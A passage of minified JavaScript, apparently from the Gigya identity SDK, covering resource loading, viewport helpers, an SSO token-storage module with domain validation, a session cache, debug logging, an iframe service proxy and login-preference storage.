              i || (i = !0, t());
            }, n.src = e;
          }(e, t);
          break;
        case i.iframe:
          !function (e, t, n) {
            void 0 === n && (n = 5e3);
            var i = document.createElement("iframe");
            i.style.width = "30px", i.style.height = "10px", i.style.position = "absolute", i.style.top = "-1000px", i.style.left = "-1000px", !0 === n && (n = 0);
            var o = function (e) {
              var i;
              !(i = e && e.srcElement ? e.srcElement : e && e.target ? e.target : this).loaded && i.parentNode && (i.loaded = !0, t(), !1 !== n && window.setTimeout(function () {
                try {
                  document.body.removeChild(i);
                } catch (e) {}
              }, n));
            };
            c.addEventListener(i, "load", o), c.addEventListener(i, "error", o), i.onload = function (e) {
              o(e);
            }, i.onerror = o, i.src = e, c.appendToBody(i);
          }(e, t, o);
          break;
        default:
          throw new Error("Unsupported resource type");
      }
    }, t.loadService = function (e, t, n) {
      var i = u.getCdnResource() + "/js/gigya.services." + e + ".js";
      g(i, function () {
        "object" == typeof console && console.error && (console.error("error loading gigya service " + e + " from url: " + i), t && t());
      }, n, !0);
    };
  }, function (e, t) {
    function n(e, t, n) {
      void 0 === n && (n = "&");
      var i = e.match(new RegExp(t + "=([^" + n + "]*)"));
      return i ? i[1] : null;
    }
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.getParamValue = n, t.getReqParamValue = function (e, t) {
      var i = n(e, t);
      return i ? decodeURIComponent(i) : null;
    };
  },,, function (e, t) {
    function n() {
      var e = 0,
        t = 0;
      return "number" == typeof window.pageYOffset ? (t = window.pageYOffset, e = window.pageXOffset) : document.body && (document.body.scrollLeft || document.body.scrollTop) ? (t = document.body.scrollTop, e = document.body.scrollLeft) : document.documentElement && (document.documentElement.scrollLeft || document.documentElement.scrollTop) && (t = document.documentElement.scrollTop, e = document.documentElement.scrollLeft), {
        left: e,
        top: t
      };
    }
    function i() {
      var e,
        t,
        n = document.documentElement,
        i = document.body;
      return window.innerHeight ? (e = window.innerHeight, t = window.innerWidth) : (0 == (e = n.clientHeight) && (e = i.clientHeight), 0 == (t = n.clientWidth) && (t = i.clientWidth)), {
        w: t,
        h: e
      };
    }
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.getScroll = n, t.getFullSize = function () {
      var e = document.documentElement,
        t = document.body,
        n = e.clientHeight;
      0 == n && (n = t.clientHeight);
      var i = e.clientWidth;
      return 0 == i && (i = t.clientWidth), {
        w: i,
        h: n
      };
    }, t.getOrientation = function () {
      var e = parseInt(window.orientation || "0");
      return e < 0 && (e += 360), e;
    }, t.getOuterSize = function () {
      var e,
        t,
        n = document.documentElement,
        i = document.body;
      return window.outerHeight ? (e = window.outerHeight, t = window.outerWidth) : (0 == (e = n.clientHeight) && (e = i.clientHeight), 0 == (t = n.clientWidth) && (t = i.clientWidth)), {
        w: t,
        h: e
      };
    }, t.getInnerSize = i, t.getMiddleCenter = function () {
      var e = n(),
        t = i();
      return {
        top: e.top + Math.floor(t.h / 2),
        left: e.left + Math.floor(t.w / 2)
      };
    }, t.isRectHorizontallyVisible = function (e) {
      var t = n(),
        o = i();
      return e.left >= t.left && e.right <= t.left + o.w;
    }, t.isRectFullyVisible = function (e) {
      var t = n(),
        o = i();
      return e.top >= t.top && e.bottom <= t.top + o.h && e.left >= t.left && e.right <= t.left + o.w;
    }, t.scrollIntoView = function (e) {
      e && e.scrollIntoView && e.scrollIntoView();
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(6),
      o = n(26),
      r = n(47),
      a = n(14),
      s = n(16),
      c = n(41),
      u = n(10),
      l = ["gigya-api.com", "gigya-api.cn", "gigya.com", "my.gigya-ext.com", "localhost"],
      d = function () {
        function e(e, t) {
          void 0 === e && (e = r.default), void 0 === t && (t = l), this._global = e, this._defaultValidDomains = t;
        }
        return e.prototype.getPageUrl = function () {
          return this._global.documentLocation().toString();
        }, e.prototype.isValidDomain = function (e, t) {
          for (var n = i.Uri.parse(t).domain, o = e.concat(this._defaultValidDomains), r = 0; r < o.length; r++) {
            var a = o[r].replace("*", "").split(":")[0],
              s = n.indexOf(a);
            if (s >= 0 && s === n.length - a.length && (0 === s || "." === n.charAt(s - 1) || "/" === n.charAt(s - 1))) return !0;
          }
          return !1;
        }, e.prototype.sendMessage = function (e, t, n) {
          var i = "";
          for (var o in e) null != e[o] && (i += escape(o + "=" + encodeURIComponent(e[o]) + "&"));
          this._global.postMessageToParent(t + "=" + i, n);
        }, e.prototype.isValidGltExp = function (e) {
          return c.isValid(e);
        }, e.prototype.getMaxGltExp = function (e, t) {
          return c.getMax(e, t);
        }, e.prototype.decodeUrl = function (e) {
          return u.URLDecodeRecursive(e);
        }, e.prototype.deserialize = function (e) {
          return s.deserialize(e);
        }, e.prototype.getCookiesStorage = function () {
          return a.initializeAdapter(a.CookieStorageAdapter);
        }, e.prototype.validations = function () {
          return o;
        }, e.prototype.UriFactory = function (e, t) {
          return void 0 === t && (t = !0), new i.Uri(e, t);
        }, e.prototype.getFragment = function () {
          var e = this.getPageUrl();
          return -1 !== e.indexOf("#") ? e.split("#")[1] : null;
        }, e;
      }();
    t.SsoUtils = d;
  }, function (e, t) {
    function n(e) {
      return e ? 1e3 * Number(e.substr(0, e.indexOf("_"))) : 0;
    }
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.isValid = function (e) {
      return n(e) > Date.now();
    }, t.getMax = function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      if (e && e.length) return e.sort(function (e, t) {
        return n(t) - n(e);
      })[0];
    }, t.getMillis = n;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(43),
      o = n(4),
      r = function () {
        function e() {}
        return e.prototype.isSessionVerified = function (e, t) {
          void 0 === t && (t = window.gigya.thisScript.APIKey);
          var n = this.createKey(e, t);
          return "true" === i.get(n);
        }, e.prototype.setIsSessionVerified = function (e, t, n) {
          void 0 === n && (n = window.gigya.thisScript.APIKey);
          var o = this.createKey(e, n);
          i.set(o, "" + t);
        }, e.prototype.createKey = function (e, t) {
          var n = o.getMurmurHash(e + "_" + t, 15).toString();
          return btoa(n);
        }, e;
      }();
    t.sessionData = new r();
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i,
      o = n(5),
      r = n(17),
      a = n(2);
    try {
      i = Boolean(window.sessionStorage);
    } catch (e) {
      i = !1;
    }
    function s(e, t) {
      if (i) {
        var n;
        try {
          if (n = o.deserialize(window.sessionStorage.getItem("gigyaCache")), null == t && n[e]) delete n[e];else {
            var s = new Date().getTime();
            n[e] = {
              response: t,
              time: s
            }, e.indexOf("gig_oidcContext_") >= 0 && window.gigya.logger.report("oidc storage logs - set", {
              key: e,
              value: n[e]
            }, !1, a.FlagService.forceErrorReport);
          }
          window.sessionStorage.setItem("gigyaCache", o.serialize(n));
        } catch (e) {}
        r.release("cache", "cache_" + e);
      }
    }
    function c(e) {
      s(e, null);
    }
    t.set = s, t.get = function e(t, n) {
      if (void 0 === n && (n = -1), !i) return null;
      try {
        if (r.isActive("cache_" + t)) return r.waitFor("cache_" + t, e, arguments), null;
        var s = window.sessionStorage.getItem("gigyaCache"),
          u = o.deserialize(s),
          l = u[t];
        if (l) {
          var d = new Date().getTime();
          return n < 0 || n + l.time > d ? l.response : (t.indexOf("gig_oidcContext_") >= 0 && window.gigya.logger.report("oidc storage logs - get", {
            key: t,
            value: u[t],
            cacheTime: l.time,
            currentTime: d
          }, !1, a.FlagService.forceErrorReport), c(t), null);
        }
        if (!l) return r.hold("cache", "cache_" + t), null;
      } catch (e) {}
      return null;
    }, t.remove = c;
  },, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(4),
      o = n(5),
      r = n(18),
      a = n(35),
      s = n(21),
      c = n(9),
      u = n(12);
    function l() {
      var e = !window.gigya.localInfo.isNativeMobileApp && u.default.get("_gig_dbgConsole_log");
      return void 0 !== e && null != e ? "1" === e : t.selectedConsoleLogLevels.length > 0;
    }
    function d(e, n, a) {
      if (void 0 === a && (a = !1), l() || a) {
        var s,
          c = e;
        if (null != (n = i.clone(n, !0, !1, 4, null, !0)) && (c += ":" + ("object" == typeof n ? "\n" : "") + o.serialize(n, !0, !0)), a && "object" == typeof console && console.log && console.log(c), l()) t._log.push(c), document.getElementById("gigya_log"), s = -1 != r.indexOf(t.CONSOLE_LOG_LEVELS, e) ? e : "log", window.gigya._.apiAdapter.onJSLog(s, c);
      }
    }
    function g() {
      a.load(s.getCdnResource("/js/gigya.services.socialize.plugins.log.min.js"), null, function () {}, !0);
    }
    function f() {}
    function p() {}
    t.CONSOLE_LOG_LEVELS = ["debug", "info", "log", "warn", "error"], t.selectedConsoleLogLevels = [], t._log = [], t.enable = function () {
      u.default.set("_gig_dbgConsole_log", "1", null);
    }, t.disable = function () {
      u.default.set("_gig_dbgConsole_log", "0", null);
    }, t._isEnabled = l, t.addLog = d, t.logCall = function (e, t, n) {
      n || (n = t.lastSource), d("Calling " + e + (n && n != e ? " for " + n : "") + (t.source && n != t.source ? " initiated from " + t.source : "") + " with these params", t);
    }, t.debug = g, t.showLog = function () {
      a.load(s.getCdnResource("/js/gigya.services.socialize.plugins.log.min.js"), null, function () {}, !0);
    }, t.show = f, t.showConfig = p, c.createAlias("gigya.debug", g);
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(40),
      r = function () {
        function e(e, t, n, i, r, a) {
          var s = this;
          void 0 === i && (i = {
            validDomains: [],
            logoutURLs: {},
            canaryCookiesNames: {
              isCanary: "gig_isCanary",
              version: "gig_canary_ver"
            }
          }), void 0 === r && (r = new o.SsoUtils()), void 0 === a && (a = r.getCookiesStorage()), this._apiKey = e, this._siteApiKey = t, this._ssoSegment = n, this._ssoConfig = i, this._utils = r, this._storage = a, this._checkFragment = function () {
            var e = s._utils.getFragment();
            e && e !== s._currentFragment && (s._currentFragment = e, s._start(s._utils.deserialize(e))), window.setTimeout(s._checkFragment, 200);
          }, this._storageKey = this._createKey("gig_loginToken");
          var c = this._ssoConfig.canaryCookiesNames;
          void 0 !== c && (this._canaryKey = this._createKey(c.isCanary), this._canaryVerKey = this._createKey(c.version));
        }
        return e.prototype.init = function () {
          this._checkFragment();
        }, e.prototype._start = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            var t;
            return i.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  if (this._mode = e.m, this._requestDomain = e.d, this._lid = e.lid, this._callbackID = e.callbackID, this._siteApiKey = e.sAPIKey, !window.parent) return console.log("gigya sso: invalid use"), [2];
                  if (!this._utils.isValidDomain(this._ssoConfig.validDomains, this._requestDomain)) return console.log("gigya sso: " + this._requestDomain + " is not in valid domain: " + this._ssoConfig.validDomains.join(",")), [2];
                  switch (e.m) {
                    case "logout":
                      return [3, 1];
                    case "removeToken":
                      return [3, 3];
                    case "getToken":
                      return [3, 5];
                    case "setToken":
                      return [3, 7];
                    case "setGroupContext":
                      return [3, 9];
                    case "setLoginTokenExp":
                      return [3, 11];
                    case "getLoginTokenExp":
                      return [3, 13];
                    case "checkTokenRenew":
                      return [3, 15];
                    case "syncCanaryIndication":
                      return [3, 17];
                    case "setGroupApiDomain":
                      return [3, 19];
                    case "getGroupApiDomain":
                      return [3, 21];
                  }
                  return [3, 23];
                case 1:
                  return [4, this.logout()];
                case 2:
                  return t = n.sent(), [3, 24];
                case 3:
                  return [4, this.removeToken()];
                case 4:
                  return n.sent(), [3, 24];
                case 5:
                  return [4, this.getToken()];
                case 6:
                  return t = n.sent(), [3, 24];
                case 7:
                  return [4, this.setToken(e.lt, String(e.expiration), e.gltexp)];
                case 8:
                  return n.sent(), [3, 24];
                case 9:
                  return [4, this.setGroupContext(e.groupContext)];
                case 10:
                  return n.sent(), [3, 24];
                case 11:
                  return [4, this.setTokenExpiration(e.loginTokenExp)];
                case 12:
                  return t = n.sent(), [3, 24];
                case 13:
                  return [4, this.getTokenExpiration()];
                case 14:
                  return t = n.sent(), [3, 24];
                case 15:
                  return [4, this.checkTokenRenew(e.loginToken)];
                case 16:
                  return t = n.sent(), [3, 24];
                case 17:
                  return [4, this.syncCanaryIndication(e.isCanary, e.canaryVersion)];
                case 18:
                  return t = n.sent(), [3, 24];
                case 19:
                  return [4, this.setGroupApiDomain(e.domain)];
                case 20:
                  return n.sent(), [3, 24];
                case 21:
                  return [4, this.getGroupApiDomain()];
                case 22:
                  return t = n.sent(), [3, 24];
                case 23:
                  t = {
                    errorCode: 405001
                  }, n.label = 24;
                case 24:
                  return this._utils.sendMessage(t, this._callbackID, this._requestDomain), [2];
              }
            });
          });
        }, e.prototype.getGroupApiDomain = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (e) {
              return [2, {
                errorCode: 0,
                domain: this._storage.getItem("apiDomain_" + this._apiKey)
              }];
            });
          });
        }, e.prototype.setGroupApiDomain = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (t) {
              return this._storage.setItem("apiDomain_" + this._apiKey, e), [2];
            });
          });
        }, e.prototype.logout = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e;
            return i.__generator(this, function (t) {
              switch (t.label) {
                case 0:
                  return e = this._getLogoutURLs(), [4, this.removeToken()];
                case 1:
                  return t.sent(), this._storage.removeItem(this._storageKey + "_visited"), [2, {
                    logoutURLs: e
                  }];
              }
            });
          });
        }, e.prototype.removeToken = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e;
            return i.__generator(this, function (t) {
              return (e = this._storage.getItem(this._storageKey)) && (this._markRevokedLoginToken(e), this._storage.removeItem(this._storageKey)), this._storage.removeItem(this._storageKey + "_exp"), this._storage.removeItem(this._storageKey + "_gltexp"), this._storage.removeItem(this._storageKey + "_session"), this._storage.removeItem(this._storageKey + "_context"), [2];
            });
          });
        }, e.prototype.getToken = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e, t, n, o, r, a, s, c, u;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return e = 0, t = this._storage.getItem(this._storageKey), "undefined" === (n = this._storage.getItem(this._storageKey + "_exp")) ? o = Date.now() - 1e3 : (o = Number(n), r = Date.now() + 63072e6, o > r && (o = Date.now() - 1e3)), a = this._storage.getItem(this._storageKey + "_gltexp"), s = this._storage.getItem(this._storageKey + "_context"), c = a || "1" === this._storage.getItem(this._storageKey + "_session"), isNaN(o) || !(0 === o && !c || o > 0 && new Date().getTime() > o) ? [3, 2] : [4, this.removeToken()];
                case 1:
                  i.sent(), t = void 0, i.label = 2;
                case 2:
                  return t ? (this._markSiteVisited(), u = {
                    errorCode: e,
                    login_token: t,
                    expires_in: 0 === o ? 0 : Math.round((o - new Date().getTime()) / 1e3)
                  }, s && (u.groupContext = s), 0 === o && a && (u.gltexp = a), [2, u]) : [2, {
                    errorCode: 403005
                  }];
              }
            });
          });
        }, e.prototype.setToken = function (e, t, n) {
          var o;
          return i.__awaiter(this, void 0, void 0, function () {
            var r, a, s;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return e = e.split("|")[0], r = null === (o = this._storage.getItem(this._storageKey)) || void 0 === o ? void 0 : o.split("|")[0], e !== r && this._markRevokedLoginToken(r), e && this._storage.setItem(this._storageKey, e), t && (0 === (a = "string" == typeof t && t ? Number(t) : t) ? t = 0 : (s = void 0, s = a ? 1e3 * Number(a) : 31536e6, a = Date.now() + s), this._storage.setItem(this._storageKey + "_exp", "" + a), 0 === t && this._storage.setItem(this._storageKey + "_session", "1", 0)), void 0 === n ? [3, 2] : [4, this.setTokenExpiration(n)];
                case 1:
                  i.sent(), i.label = 2;
                case 2:
                  return e ? [4, this._markSiteVisited()] : [3, 4];
                case 3:
                  i.sent(), i.label = 4;
                case 4:
                  return [2];
              }
            });
          });
        }, e.prototype.setGroupContext = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (t) {
              return this._storage.setItem(this._storageKey + "_context", JSON.stringify(e)), [2];
            });
          });
        }, e.prototype.setTokenExpiration = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            var t, n, o;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return this._utils.isValidGltExp(e) ? [3, 1] : (this._storage.removeItem(this._storageKey + "_gltexp"), e = null, [3, 3]);
                case 1:
                  return n = (t = this._utils).getMaxGltExp, o = [e], [4, this.getTokenExpiration()];
                case 2:
                  e = n.apply(t, o.concat([i.sent().gltexp])), this._storage.setItem(this._storageKey + "_gltexp", e), this._storage.removeItem(this._storageKey + "_exp"), i.label = 3;
                case 3:
                  return [2, {
                    errorCode: 0,
                    gltexp: e
                  }];
              }
            });
          });
        }, e.prototype.getTokenExpiration = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (e) {
              return this._storage.getItem(this._storageKey) ? [2, {
                errorCode: 0,
                gltexp: this._storage.getItem(this._storageKey + "_gltexp")
              }] : [2, {
                errorCode: 403005
              }];
            });
          });
        }, e.prototype.checkTokenRenew = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            var t, n;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return [4, this.getToken()];
                case 1:
                  return t = i.sent(), n = this._storage.getItem(this._storageKey + "_revoked_tokens") || "", n.indexOf(e) >= 0 ? [3, 3] : [4, this.setToken(e)];
                case 2:
                  return i.sent(), [2, {
                    errorCode: 0
                  }];
                case 3:
                  return 0 === t.errorCode && n.indexOf(t.login_token) < 0 ? (t.errorCode = 403032, [2, t]) : [2, {
                    errorCode: 403025
                  }];
                case 4:
                  return [2];
              }
            });
          });
        }, e.prototype.syncCanaryIndication = function (e, t) {
          return i.__awaiter(this, void 0, void 0, function () {
            var n, o, r, a, s;
            return i.__generator(this, function (i) {
              return this._canaryKey && this._canaryVerKey ? (n = this._storage.getItem(this._canaryKey), o = this._storage.getItem(this._canaryVerKey), r = {
                errorCode: 0,
                isCanary: e,
                canaryVersion: t
              }, this._utils.validations().allDefinedOrAllUndefined(n, o) ? this._utils.validations().allDefinedOrAllUndefined(e, t) ? (a = this._parseCanaryVersionSignature(t), s = this._parseCanaryVersionSignature(o), a.timestamp > s.timestamp ? (this._storage.setItem(this._canaryKey, e), this._storage.setItem(this._canaryVerKey, t)) : (r.isCanary = n, r.canaryVersion = o), [2, r]) : [2, {
                errorCode: 400006,
                isCanary: n,
                canaryVersion: o
              }] : (r.errorCode = 400006, [2, r])) : [2, {
                errorCode: 500033
              }];
            });
          });
        }, e.prototype._markSiteVisited = function () {
          var e = this._storageKey + "_visited",
            t = this._storage.getItem(e) || "";
          -1 === t.indexOf(this._siteApiKey) && (t += "," + this._siteApiKey), this._storage.setItem(e, t);
        }, e.prototype._markRevokedLoginToken = function (e) {
          if (e) {
            var t = this._storageKey + "_revoked_tokens",
              n = this._storage.getItem(t) || "",
              i = n.split(",");
            i.length > 3 && i.splice(1, 1), (n = i.join(",")).indexOf(e) < 0 && (n += "," + e), this._storage.setItem(t, n);
          }
        }, e.prototype._getLogoutURLs = function () {
          var e = this._storage.getItem(this._storageKey + "_visited");
          if (!e) return "";
          var t = [];
          for (var n in this._ssoConfig.logoutURLs) -1 !== e.indexOf("," + n) && t.push(this._ssoConfig.logoutURLs[n]);
          return t.join(",");
        }, e.prototype._createKey = function (e) {
          return e + "_" + this._apiKey + (this._ssoSegment ? "_" + this._ssoSegment : "");
        }, e.prototype._parseCanaryVersionSignature = function (e) {
          var t = {
            build: 0,
            probability: 0,
            timestamp: -1
          };
          if (!e) return t;
          var n = e.split("-");
          return n.length < 3 ? t : {
            build: Number(n[0]),
            probability: Number(n[1]),
            timestamp: Number(n[2])
          };
        }, e;
      }();
    t.Sso = r;
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function () {
      function e() {}
      return e.prototype.documentLocation = function () {
        return document.location;
      }, e.prototype.postMessageToParent = function (e, t, n) {
        window.parent.postMessage(e, t, n);
      }, e;
    }();
    t.GlobalProvider = n, t.default = new n();
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(25),
      r = function () {
        function e(e, t, n, i, r, a) {
          var s = this;
          void 0 === t && (t = 6e4), void 0 === n && (n = o.generateId), void 0 === i && (i = o.createIframe), void 0 === r && (r = function () {
            return new gigya.Promise(function (e) {
              document.body ? e(document.body) : document.addEventListener("DOMContentLoaded", function () {
                return e(document.body);
              });
            });
          }), void 0 === a && (a = window), this.url = e, this.timeout = t, this._idCreator = n, this._iframeCreator = i, this.getIframeHost = r, this._win = a, this._pendingReqs = [], this._mutationObservers = [], this.onResponse = function (e) {
            var t = window.gigya.utils.JSON.parse(e.data);
            t && s._pendingReqs[t.id] && s.validateOrigin(e.origin) && (s._pendingReqs[t.id](t), delete s._pendingReqs[t.id]);
          };
        }
        return Object.defineProperty(e.prototype, "isInit", {
          get: function () {
            return Boolean(this._iframe);
          },
          enumerable: !0,
          configurable: !0
        }), e.prototype.init = function (e) {
          var t = this;
          return this.isInit ? gigya.Promise.reject("proxy already initialized") : new gigya.Promise(function (n, i) {
            t._iframe = t._iframeCreator(e), t._iframe.src = t.url, t.getIframeHost().then(function (e) {
              t._iframeHost = e, t._iframeHost.appendChild(t._iframe), window.gigya.logger.isEnabled && t.startObservingIFrameRemoval();
              var o = t._win.setTimeout(function () {
                  return i("proxy init timeout");
                }, t.timeout),
                r = function (e) {
                  if (t.validateOrigin(e.origin)) {
                    var a = t._tryParseResponse(e.data);
                    if (null == a ? void 0 : a.signal) switch (t._win.clearTimeout(o), t._win.removeEventListener("message", r, !0), a.signal) {
                      case "listening":
                        t._win.addEventListener("message", t.onResponse, !0), n(a.res);
                        break;
                      case "error":
                      case "stop":
                        i(a.res);
                        break;
                      default:
                        i("unsupported response");
                    }
                  }
                };
              t._win.addEventListener("message", r, !0);
            });
          });
        }, e.prototype.validateOrigin = function (e) {
          return o.validateOrigin(this._iframe.src, e);
        }, e.prototype.postToIFrame = function (e) {
          var t = this.registerMessage(e),
            n = "object" == typeof e ? JSON.stringify(e) : e;
          return this._iframe.contentWindow.postMessage(n, this._iframe.src), t;
        }, e.prototype.registerMessage = function (e, t) {
          var n = this;
          return void 0 === t && (t = this.timeout), new gigya.Promise(function (i, o) {
            var r = n._win.setTimeout(function () {
              o("proxy request timeout");
            }, t);
            n._pendingReqs[e.id] = function (e) {
              n._win.clearTimeout(r), "error" === e.signal ? o(e.res) : i(e.res);
            };
          });
        }, e.prototype.sendRequest = function (e, t) {
          return this.postToIFrame({
            id: this._idCreator(),
            methodName: e,
            params: t
          });
        }, e.prototype.stop = function (e) {
          return void 0 === e && (e = !1), i.__awaiter(this, void 0, void 0, function () {
            var t, n;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  if (this.isInit) return [3, 1];
                  throw "proxy is not active";
                case 1:
                  t = void 0, i.label = 2;
                case 2:
                  return i.trys.push([2, 4, 5, 6]), [4, this.postToIFrame({
                    id: this._idCreator(),
                    signal: "stop"
                  })];
                case 3:
                  return [2, i.sent()];
                case 4:
                  throw n = i.sent(), t = n, n;
                case 5:
                  return t && !e || (this._mutationObservers && this._mutationObservers.length && this.stopObservingIFrameRemoval(), this._win.removeEventListener("message", this.onResponse, !0), this._iframeHost.removeChild(this._iframe), delete this._iframe), [7];
                case 6:
                  return [2];
              }
            });
          });
        }, e.prototype.wrapWith = function (e) {
          var t;
          if ("function" == typeof e) t = o.getAllClassMethodsNames(e);else if (e instanceof Array) t = e;else {
            if ("object" != typeof e) throw "unsupported type for wrapper";
            t = Object.keys(e);
          }
          return this.proxyFromKeys(t);
        }, e.prototype.proxyFromKeys = function (e) {
          var t = this,
            n = {};
          return e.forEach(function (e) {
            return n[e] = function () {
              for (var n = [], i = 0; i < arguments.length; i++) n[i] = arguments[i];
              return t.sendRequest(e, n);
            };
          }), n;
        }, e.prototype.startObservingIFrameRemoval = function () {
          for (var e = this._iframe; e.parentElement;) this.addMutationObserver(e), e = e.parentElement;
        }, e.prototype.stopObservingIFrameRemoval = function () {
          this._mutationObservers.forEach(function (e) {
            e && e.disconnect && e.disconnect();
          }), this._mutationObservers = [];
        }, e.prototype.addMutationObserver = function (e) {
          var t = this,
            n = new MutationObserver(function (n) {
              for (var i = 0, o = n; i < o.length; i++) {
                var r = o[i];
                if ("childList" == r.type && r.removedNodes.length) for (var a = 0; a < r.removedNodes.length; a++) {
                  if (r.removedNodes.item(a) === e) return window.gigya.logger.warn("### Gigya's service proxy has been unexpectedly detached from the DOM. This may cause unexpected behavior including a complete loss of service. ###"), void t.stopObservingIFrameRemoval();
                }
              }
            });
          n.observe(e.parentElement, {
            childList: !0,
            subtree: !1
          }), this._mutationObservers.push(n);
        }, e.prototype._tryParseResponse = function (e) {
          try {
            return JSON.parse(e);
          } catch (t) {
            window.gigya.logger.warn("received message with invalid format", {
              data: e
            });
          }
        }, e;
      }();
    t.ServiceProxy = r;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(4),
      o = n(13),
      r = n(6);
    t.redirect = function (e, t, n, a, s) {
      if (void 0 === s && (s = window.document), n && "post" == n.toLowerCase()) {
        var c = s.createElement("form"),
          u = [];
        c.setAttribute("accept-charset", "UTF-8"), c.setAttribute("method", "POST"), c.setAttribute("action", e), a && c.setAttribute("target", a);
        var l = i.merge(t);
        for (var d in l) "number" != typeof l[d] && "boolean" != typeof l[d] && "string" != typeof l[d] || "eventName" == d || u.push('<textarea name="' + encodeURIComponent(d) + '">' + l[d].toString().replace(/\&/g, "&amp;") + "</textarea>");
        c.innerHTML = u.join(""), c.style.display = "none", o.appendToBody(c, s), c.submit();
      } else {
        for (var g = new r.Uri(e), f = {}, p = 0; p < t.length; p++) {
          var h = t[p];
          for (var v in h) if (h.hasOwnProperty(v)) {
            var y = h[v];
            f[v] = y;
          }
        }
        g.addToSearch(f), s.location.href = g.toString();
      }
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(14),
      r = n(4),
      a = n(60),
      s = function () {
        function e() {}
        return Object.defineProperty(e, "SITE_PREFERENCES_KEY", {
          get: function () {
            return window.gigya.apiKey + "_preferences";
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e, "SITE_GIG_KEY", {
          get: function () {
            return window.gigya.apiKey + "_gig";
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "didForcedBootstrap", {
          get: function () {
            return this.getDataByKey(e.SITE_GIG_KEY).didForcedBootstrap || null;
          },
          set: function (t) {
            this.setDataByKey(e.SITE_GIG_KEY, {
              didForcedBootstrap: t
            });
          },
          enumerable: !0,
          configurable: !0
        }), e.prototype.getPreferredLoginMethod = function (t) {
          var n, i, o, r;
          if (!t) return "";
          var a = this.getDataByKey(e.SITE_PREFERENCES_KEY);
          return null !== (r = null === (o = (null !== (i = null === (n = null == a ? void 0 : a.authentication) || void 0 === n ? void 0 : n.usersPreferredLoginMethods) && void 0 !== i ? i : []).find(function (e) {
            return e.identifier === t;
          })) || void 0 === o ? void 0 : o.preferredLoginMethod) && void 0 !== r ? r : "";
        }, e.prototype.setPreferredLoginMethod = function (t, n) {
          var o, r, a, s;
          if (n) {
            var c = this.getDataByKey(e.SITE_PREFERENCES_KEY),
              u = i.__spreadArrays(null !== (r = null === (o = null == c ? void 0 : c.authentication) || void 0 === o ? void 0 : o.usersPreferredLoginMethods) && void 0 !== r ? r : []),
              l = null !== (s = null === (a = null == c ? void 0 : c.authentication) || void 0 === a ? void 0 : a.tfaPreferredMethod) && void 0 !== s ? s : "",
              d = u.some(function (e) {
                return e.identifier === n;
              });
            this.isMaxLimitUsersPreferredLoginMethodsReached(u) && !d && (u = this.removeOldestUserPreferredLoginMethod(u)), d || (u = this.addUserPreferredLoginMethod(u, {
              identifier: n,
              preferredLoginMethod: t
            })), d && (u = this.refreshExistingUserPreferredLoginMethod({
              authMethod: t,
              identifier: n,
              usersPreferredLoginMethods: u
            })), this.setDataByKey(e.SITE_PREFERENCES_KEY, {
              authentication: {
                usersPreferredLoginMethods: u,
                tfaPreferredMethod: l
              }
            });
          }
        }, e.prototype.setScreenVariant = function (t, n, i, o) {
          var r, a, s;
          this.setDataByKey(e.SITE_PREFERENCES_KEY, ((r = {})[t] = {
            screens: (a = {}, a[n] = (s = {}, s[i] = {
              variant: o
            }, s), a)
          }, r));
        }, e.prototype.getScreenVariant = function (t, n, i) {
          var o,
            r,
            a,
            s,
            c = this.getDataByKey(e.SITE_PREFERENCES_KEY);
          return null === (s = null === (a = null === (r = null === (o = null == c ? void 0 : c[t]) || void 0 === o ? void 0 : o.screens) || void 0 === r ? void 0 : r[n]) || void 0 === a ? void 0 : a[i]) || void 0 === s ? void 0 : s.variant;
        }, e.prototype.getDataByKey = function (e) {
          return o.getObject(e, {});
        }, e.prototype.setDataByKey = function (e, t) {
          var n = this.getDataByKey(e);
          try {
            o.setObject(e, r.removeUndefined(a(n, t)));
          } catch (t) {
            window.gigya.logger.report("Failed to save local site data", {
              error: t,
              key: e
            });
          }
        }, e.prototype.refreshExistingUserPreferredLoginMethod = function (e) {
          var t = e.usersPreferredLoginMethods,
            n = e.identifier,
            i = e.authMethod,
            o = this.removeUserPreferredLoginMethod(t, n);
          return this.addUserPreferredLoginMethod(o, {
            identifier: n,
            preferredLoginMethod: i
          });
        }, e.prototype.removeUserPreferredLoginMethod = function (e, t) {
          return e.filter(function (e) {
            return e.identifier !== t;
          });
        }, e.prototype.isMaxLimitUsersPreferredLoginMethodsReached = function (e) {
          return 10 === e.length;
